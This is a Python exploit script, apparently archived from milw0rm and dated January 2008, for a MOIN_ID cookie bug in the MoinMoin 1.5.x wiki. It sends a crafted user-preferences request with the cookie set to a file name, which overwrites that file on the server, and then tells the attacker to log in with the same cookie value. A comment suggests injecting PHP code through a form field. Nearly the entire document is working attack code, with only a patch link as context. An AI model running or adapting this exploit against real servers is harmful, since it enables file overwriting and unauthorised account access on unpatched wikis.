#!/usr/bin/python
#
#Exploit for the MOIND_ID cookie Bug
# MoinMoin 1.5.x
#
#Find your patch in : http://hg.moinmo.in/moin/1.5/rev/e69a16b6e630
#
#Bug and exploit coded by just a nonroot and colombian user
#
#Enero 21 de 2008
#
#Greets: el directorio and all the SL community
#
#
import urllib2,sys
print "MoinMoin host: i.e: http://127.0.0.1:8000/"
host=raw_input("MoinMoin host ( include http and /): ")
#info for the new user
#
#user for the test
user='nonroot'
#password for the test
password='nonrootuser'
#email for the test
email='just@nonrootuser.co'
#file to overwrite
#by default this file is there, is there?
archivo='README'
#######
#
req = urllib2.Request(host)
adddata="action=userform&name="+user+"&aliasname=ilikecolombianpeople&password="+password+"&password2="+password+"&email="+email+"&css_url=&edit_rows=20&theme_name=modern&editor_default=text&editor_ui=freechoice&tz_offset=0&datetime_fmt=&language=&remember_me=1&show_fancy_diff=1&show_toolbar=1&show_page_trail=1&quicklinks=podriamos-insertar-codigo-php-aqui-verdad-que-si&save=Save"
headers={'Cookie':'MOIN_ID='+archivo}
req = urllib2.Request(host+"UserPreferences/",adddata,headers)
try:
	r = urllib2.urlopen(req)
	data=r.read()
except	urllib2.HTTPError:
	print "Wait a minute, is posible that the file: "+archivo+" doesn't have permission to write, think well, and try again"
	sys.exit(2)
print "Ok, the file: "+archivo+" was created, and you can logging setting the cookie MOIN_ID='"+archivo+"'"+" in your browser."
sys.exit(0)

# milw0rm.com [2008-01-21]